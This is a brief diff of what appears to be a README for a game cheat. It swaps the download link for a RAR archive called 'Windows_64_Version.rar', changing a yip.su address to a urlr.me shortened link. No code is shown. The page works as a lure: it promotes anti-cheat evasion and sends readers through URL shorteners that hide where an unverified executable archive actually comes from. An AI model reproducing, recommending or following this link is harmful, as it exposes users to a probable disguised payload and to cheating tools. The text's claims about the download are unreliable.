@@ -7,4 +7,4 @@ Take into account that with updates to the game and anti-cheat game quality can 
 
 ![img](https://i.imgur.com/Z47f5ph.jpeg)
 
-# You can download it here - [DW link](https://yip.su/Windows_64_Version.rar)
+# You can download it here - [DW link](https://urlr.me/BhQryV)
